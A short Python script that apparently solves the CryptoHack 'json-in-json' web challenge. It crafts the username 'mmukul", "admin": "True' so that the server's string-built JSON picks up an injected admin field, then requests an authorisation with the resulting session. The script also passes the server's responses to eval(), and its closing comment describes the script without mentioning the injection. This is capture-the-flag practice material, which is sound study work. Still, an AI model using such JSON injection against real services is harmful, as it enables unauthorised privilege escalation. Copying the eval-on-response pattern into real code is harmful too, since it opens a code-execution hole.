import jwt 
import json 
import requests

url_create = "https://web.cryptohack.org/json-in-json/create_session/"
url_auth = "https://web.cryptohack.org/json-in-json/authorise/"

s = 'mmukul", "admin": "True'
print(s)
body = '{' \
              + '"admin": "' + "False" \
              + '", "username": "' + str(s) \
              + '"}'
# print(body)
# print(json.loads(body))
session = eval(requests.get(f"{url_create}{s}/").text)["session"]
print(eval(requests.get(f"{url_auth}{session}/").text)["response"])


# This script interact with a web API by creating a session with a request and then authorizing it. The body variable to builds a JSON string but includes hardcoded values for "admin" and "username". The session is retrieved by sending a request to the url_create endpoint and using it in the url_auth endpoint to get the response.
